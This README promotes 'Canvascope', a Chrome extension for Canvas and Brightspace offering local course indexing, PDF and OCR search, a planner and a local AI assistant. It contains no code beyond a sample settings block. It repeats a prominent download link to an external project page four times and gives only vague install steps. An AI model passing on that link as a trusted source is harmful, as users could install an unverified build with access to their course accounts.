# Canvascope v10.1.0 - Chrome extension 2026

> **Canvascope v10.1.0 is a Chrome extension for Canvas and Brightspace that creates local-first course indexes, makes course content easier to search, and provides planner and PDF-focused workflows.**

[![Platform](https://img.shields.io/badge/Platform-Chrome-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v10.1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lucas-halltaao2696/canvascope-chrome-extension?style=flat-square)](https://github.com/lucas-halltaao2696/canvascope-chrome-extension)

---

<p align="center">
  <a href="https://lucas-halltaao2696.github.io/canvascope-chrome-extension/">
    <img src="https://img.shields.io/badge/Download-Canvascope%20Latest-brightgreen?style=for-the-badge" alt="Download Canvascope">
  </a>
</p>

> **[Download Canvascope v10.1.0](https://lucas-halltaao2696.github.io/canvascope-chrome-extension/)**

---

[Download Latest Build](https://lucas-halltaao2696.github.io/canvascope-chrome-extension/)

---

## What Canvascope Does

Canvascope brings course-centered tools to students using Canvas and Brightspace. Rather than depending on a remote search service for every request, it builds a local-first index of course content for browsing and searching within the browser.

The extension is intended for faster document access, planner-based academic organization, and courses that rely heavily on PDFs. It combines offline PDF text extraction, OCR search for scanned documents, and a hybrid local AI RAG assistant in a single Chrome extension.

---

## Core Capabilities

- Builds local-first indexes of LMS course content
- Searches within the active course context
- Supports planner workflows for organizing academic tasks
- Extracts text from PDFs while offline
- Searches scanned PDF content through OCR
- Provides a hybrid local AI RAG assistant for contextual help
- Hands PDFs off to Lectra with realtime synchronization
- Runs in Chrome with Canvas and Brightspace

---

## Getting Started

1. Download the newest build from the project page.
2. Install the Chrome extension through the repository's packaged release or extension loading workflow.
3. Navigate to Canvas or Brightspace in Chrome and let Canvascope start creating its local index.

For a manual installation, first clone or download the repository contents. Then open Chrome's extension management page and load the unpacked folder.

---

## Using the Extension

Once installed, open a supported course in your LMS and wait while Canvascope indexes the available material.

A normal session looks like this:

1. Open a course in Canvas or Brightspace.
2. Allow the extension to process the course content that is available.
3. Search the current course for pages, documents, and extracted PDF text.
4. Use the planner features to arrange academic tasks.
5. For more demanding file searches, use OCR or the local RAG assistant.

---

## Settings and Configuration

The extension handles course indexing locally and keeps browser-side workflow settings in the local browser environment. Options that are available can generally be adjusted through the Canvascope interface.

Example settings layout:

    {
      "course_indexing": "local-first",
      "search_scope": "current-course",
      "pdf_text_extraction": true,
      "ocr_search": true,
      "rag_assistant": "hybrid-local",
      "planner": true
    }

---

## Requirements

- Google Chrome
- Access to a Canvas or Brightspace account and course
- Sufficient local browser storage for indexed courses and extracted content
- Permission for the extension to operate on the LMS pages you use

---

## Frequently Asked Questions

**How can I install a newer version?**  
Visit the project download page and obtain the latest available build and version.

**Where does Canvascope save configuration?**  
Settings are stored locally in the browser unless the extension workflow specifies another location.

**Why are some search results missing?**  
Wait until indexing for the current course has completed. Then refresh the course view and run the search again.

**Can the extension process PDFs?**  
Yes. Canvascope supports offline PDF text extraction as well as OCR-based searching for scanned PDFs.

**What should I check if the extension does not work on first launch?**  
Check Chrome's permissions, make sure the extension is loaded correctly, and return to a supported LMS course so local indexing can begin.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
